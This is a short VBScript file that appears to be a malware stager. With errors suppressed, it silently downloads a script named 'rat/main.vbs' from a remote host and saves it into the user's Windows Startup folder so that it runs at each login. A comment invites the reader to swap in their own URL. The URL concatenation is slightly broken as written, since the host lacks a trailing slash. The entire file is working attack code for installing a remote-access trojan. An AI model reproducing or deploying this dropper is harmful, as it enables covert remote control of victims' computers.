On Error Resume Next ' silence errors

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Startup folder
startup = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"

Dim serverAddr
serverAddr = "https://sellitcom.github.io"

' Base URL of file
baseURL = serverAddr & "rat/main.vbs"   ' <-- change to your URL

' Add cache buster
cacheBuster = "?v=" & Replace(CStr(Timer * 1000), ".", "")
fileURL = baseURL & cacheBuster

' Extract filename
fileName = Mid(baseURL, InStrRev(baseURL, "/") + 1)

' Save path
savePath = startup & "\" & fileName

' Download silently
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", fileURL, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile savePath, 2  ' overwrite
    stream.Close
End If
